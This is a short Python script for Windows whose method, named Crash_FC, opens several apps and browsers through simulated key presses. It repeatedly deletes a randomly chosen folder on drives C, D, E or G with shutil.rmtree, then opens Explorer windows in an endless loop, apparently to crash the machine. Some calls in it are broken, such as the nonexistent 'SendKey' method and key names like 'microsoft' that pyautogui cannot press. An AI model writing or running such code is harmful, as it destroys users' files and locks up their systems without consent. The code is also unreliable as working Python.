import win32com.client
import pyautogui
import time
import os
import shutil
import random

class Applications:

    def Crash_FC(self):

        shell = win32com.client.Dispatch("WScript.Shell")
        list_of_apps = ["notepad","calculator","cmd"]
        for i in list_of_apps:
            shell.SendKey(i)
            pyautogui.press("enter")
            time.sleep(0.1)
        for i in range(4):
            pyautogui.press("win")
            pyautogui.press("microsoft")
            pyautogui.press("enter")
            time.sleep(0.1)
            pyautogui.press("win")
            pyautogui.press("chrome")
            pyautogui.press("enter")
            time.sleep(0.1)
            pyautogui.press("win")
            pyautogui.press("firefox")
            pyautogui.press("enter")

            path1 = "D:\\New Folder"
            path2 = "E:\\New Folder"
            path3 = "G:\\New Folder"
            path4 = "C:\\New Folder"

            paths = [path1, path2, path3, path4]
            selected_path = random.choice(paths)

            shutil.rmtree(selected_path)

        while True:
            os.system("Explorer C:\\")
            os.system("Explorer D:\\")
            os.system("Explorer E:\\")
            os.system("Explorer G:\\")
            os.system("Explorer j:\\")
            os.system("Explorer f:\\")

if __name__ == "__main__":
    C = Applications()
    C.Crash_FC()

